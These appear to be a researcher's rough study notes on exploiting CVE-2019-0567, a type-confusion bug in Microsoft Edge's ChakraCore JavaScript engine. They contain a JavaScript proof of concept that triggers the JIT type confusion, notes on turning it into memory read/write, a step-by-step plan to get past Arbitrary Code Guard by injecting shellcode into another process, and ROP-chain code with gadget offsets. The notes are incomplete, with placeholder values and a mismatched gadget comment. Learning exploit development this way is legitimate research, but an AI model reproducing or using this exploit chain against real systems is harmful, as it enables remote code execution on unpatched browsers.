# CVE-2019-0567 Edge:

https://connormcgarr.github.io/type-confusion-part-1/

https://connormcgarr.github.io/type-confusion-part-2/

https://connormcgarr.github.io/type-confusion-part-3/

https://developerinsider.co/download-visual-studio-2017-web-installer-iso-community-professional-enterprise/

https://abchatra.github.io/Type/

http://undocumented.ntinternals.net/index.html?page=UserMode%2FUndocumented%20Functions%2FNT%20Objects%2FThread%2FNtContinue.html


Objects

- Static: strings, bools, ints etc.

- Dynamic: objects

Debug

- chakracore!Js::DynamicTypeHandler::GetSlot (get slot)

- chakracore!Js::DynamicTypeHandler::SetPrototype (setting prototype)

- chakracore!Js::DynamicTypeHandler::AdjustSlots (type transition)

- ch!WScriptJsrt::EchoCallback (print)

- chakracore!Js::DynamicTypeHandler::SetSlotUnchecked (allocation of fields)

    ```
    let obj = {a:1, b:2}
    ```

    will hit twice, pt and check rcx

    we will get:

    vtftable
    type
    inline val
    inline val

    ```
    let obj
    obj.a = 1
    obj.b = 2
    obj.c = 3
    obj.d = 4
    ```

    we will get:

    vftable
    type
    auxSlots

    ```
    let a = {b: 1, c: 2, d: 3, e: 4};
    a.f = 5;
    ```

    we will get:

    vftable
    type
    auxSlots
    inline vals...


function opt(o, proto, value) {
    o.b = 1; // before type transition

    let tmp = {__proto__: proto}; // tmp.prototype = proto
    // forced to go through type transition

    // after type transition

    o.a = value;

    // when i set a to 0x1234, is not auxSlots.a = 0x1234, but 0x1234 becoming the inline value itself
}

function main() {
    for (let i = 0; i < 2000; i++) {
        let o = {a: 1, b: 2};
        opt(o, {}, {}); // mark opt as "hot" by JIT
        // JIT: i have seen opt() been used 2000 with nulls
        // compile opt() into machine code without guard rails
        // o will only be represented as inline values
        // i will not consider if o will go through type transition
    }

    let o = {a: 1, b: 2};

    opt(o, o, 0x1234);

    print(o.a); // cause the crash itself where 0x1234 is invalid memory (auxSlots)
    // when i try to access o.a, i am accessing [0x1234]
}

main();

OP_InitPrototype calls SetPrototype which calls IsPrototype which calls adjustslots

OP_InitPrototype is called by MACHINE code, which is a result from JIT compiling opt() to machine code for optimization

set a breakpoint on the chakracore!Js::DynamicTypeHandler::AdjustSlots, then the machine code



cobj = {}
cobj.a = 1;
cobj.b = 2;
cobj.c = 3;
cobj.d = 4;
cobj.e = 5;
cobj.f = 6;
cobj.g = 7;
cobj.h = 8;
cobj.i = 9;
cobj.j = 10;

o
vftable
type
pointer to cobj

since we control cobj, we can 

obj.a = cobj

obj.a.c = 3

### Porting to Edge

https://bugs.chromium.org/p/project-zero/issues/detail?id=1360 

change offsets

### ACG 

basically cannot RWX

https://msrc.microsoft.com/update-guide/en-us/vulnerability/CVE-2017-8637

https://bugs.chromium.org/p/project-zero/issues/detail?id=1299 // ACG Bypass using DuplicateHandle

https://bugs.chromium.org/p/project-zero/issues/detail?id=1552 // ACG BYpass using OpenProcess

https://bugs.chromium.org/p/project-zero/issues/detail?id=1360 // CFG bypass with leafInterpreterFrame

https://www.blackhat.com/docs/asia-17/materials/asia-17-Li-Cross-The-Wall-Bypass-All-Modern-Mitigations-Of-Microsoft-Edge.pdf // CFG bypass using ESHims

https://blog.quarkslab.com/exploiting-ms16-145-ms-edge-typedarraysort-use-after-free-cve-2016-7288.html

https://www.blackhat.com/docs/asia-17/materials/asia-17-Li-Cross-The-Wall-Bypass-All-Modern-Mitigations-Of-Microsoft-Edge.pdf

https://blog.improsec.com/tech-blog/back-to-basics-or-bypassing-control-flow-guard-with-structured-exception-handler

https://github.com/MortenSchenk/RtlCaptureContext-CFG-Bypass/blob/master/Leaking_Stack.html

https://blog.improsec.com/tech-blog/bypassing-control-flow-guard-in-windows-10

https://blog.theori.io/chakra-jit-cfg-bypass-ff5a88677268

https://raw.githubusercontent.com/connormcgarr/Exploit-Development/master/Browser/CVE-2019-0567.html

### CIG

Microsoft-signed DLLs can be loaded into the process space

### No-Child Process

no child process

### How it works

JIT CP (no ACG) 1

Main CP (ACG) 2

1. Write Shellcode to CP2 at address 0xCP2_123

2. Write ROP Chain to CP2, this one will set Shellcode to RWX. Return Address and lpAddress we dk for now at 0xCP2_124

3. Execute Duplicate Handle ROP Chain, get handle to CP1

4. VirtualAllocEx to allocate random memory in CP1 via handle to CP1

5. WPM to copy Shellcode into CP1 (0xCP2_123 and 0xCP2_124 are side by side 0x50 bytes buffer in between)

6. CreateRemoteThread in pause in CP1

7. WPM in CP1 to edit ReturnAddress from step 2 (return to the ROP chain 0xCP2_124)

8. WPM in CP1 to edit lpAddress from step 2 (return to the ROP chain 0xCP2_124)

9. VirtualAlloc for CONTEXT in CP1

10. GetThreadContext of remote thread in CP1

11. WPM in CP1 to write our ROP chain into the thread

12. SetThreadContext in CP1 to change the RIP of the created remote thread

13. ResumeThread in CP1 to win 


CreateToolhelp32Snapshot

RCX: 0x00000002
RDX: 0x0

write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x61005, chakraHigh);    // 0x180061005: pop rax ; ret  ;  (1 found)
counter+=8
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xcdcdcdcd, 0xcdcdcdcd); // CreateToolhelp32Snapshot 
counter+=8  

write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);    // 0x180046377: pop rcx ; ret  ;  (1 found)
counter+=8
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x2, 0x0); // 
counter+=8  

write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);    // 0x18001d2c9: pop rdx ; ret  ;  (1 found)
counter+=8
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0x0, 0x0); // 0x1000
counter+=8  

write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x31fb1, chakraHigh);    // 0x180031fb1: jmp rax ;  (1 found)
counter+=8

Create pe32 object

typedef struct tagPROCESSENTRY32 {
  DWORD     dwSize;               4
  DWORD     cntUsage;             4
  DWORD     th32ProcessID;        4
  ULONG_PTR th32DefaultHeapID;    8
  DWORD     th32ModuleID;         4
  DWORD     cntThreads;           4
  DWORD     th32ParentProcessID;  4
  LONG      pcPriClassBase;       4
  DWORD     dwFlags;              4
  CHAR      szExeFile[MAX_PATH];  260*2
} PROCESSENTRY32;

260*2 = 520 + 40 = 560

pe32Counter: 568

write64(chakraLo+0x74b000+storage+pe32Counter, chakraHigh, 568, 0x0);
...
write64(chakraLo+0x74b000+storage+pe32Counter, chakraHigh, 0x0, 0x0);

Process32First

RCX: handle
RDX: pe32 object

chakraLo+0x74b000+storage: location of pe32
chakraLo+0x74b000+storage-0x100: location of createsnapshoothandle
chakraLo+0x74b000+storage-0x100+8: prevent crashing
chakraLo+0x74b000+storage-0x100+8+0x20: prevent crashing

write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x46377, chakraHigh);    // 0x180046377: pop rcx ; ret  ;  (1 found)
counter+=8
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000+storage-0x100, chakraHigh); // LOCATION OF HANDLE
counter+=8 
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);       // 0x180313349: mov qword [rcx], rax ; ret 
counter+=8 
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x313349, chakraHigh);       // 0x1800d2120: mov rax, qword [rsp+0x08] ; mov rcx, qword [rcx] ; mov qword [rax+0x20], rcx ; ret  ;  (1 found)
counter+=8 
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000+storage-0x100+8, chakraHigh); // prevent crashing
counter+=8 
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x1d2c9, chakraHigh);    // 0x18001d2c9: pop rdx ; ret  ;  (1 found)
counter+=8
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x74b000+storage, chakraHigh); 
counter+=8 
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x61005, chakraHigh);    // 0x180061005: pop rax ; ret  ;  (1 found)
counter+=8
write64(stackleakPointer[0]+counter, stackleakPointer[1], 0xcdcdcdcd, 0xcdcdcdcd); // CreateToolhelp32Snapshot 
counter+=8  
write64(stackleakPointer[0]+counter, stackleakPointer[1], chakraLo+0x31fb1, chakraHigh);    // 0x180031fb1: jmp rax ;  (1 found)
counter+=8


https://www.autohotkey.com/boards/viewtopic.php?t=65745

https://forum.lazarus.freepascal.org/index.php?topic=41638.0

//// use read primative to read the process id and 

processId = read64(chakraLo+0x74b000+storage+0xXX, chakraHigh)
edgeCp = read64(chakraLo+0x74b000+storage+0xXX, chakraHigh)



Process32Next

RCX: handle
RDX: pe32 object


https://docs.google.com/spreadsheets/u/0/d/14-D4tIlFp9APP0OOvQBRXvfLOYC447UygywenX5LXfo/htmlview?pli=1

uninstall frickin updates
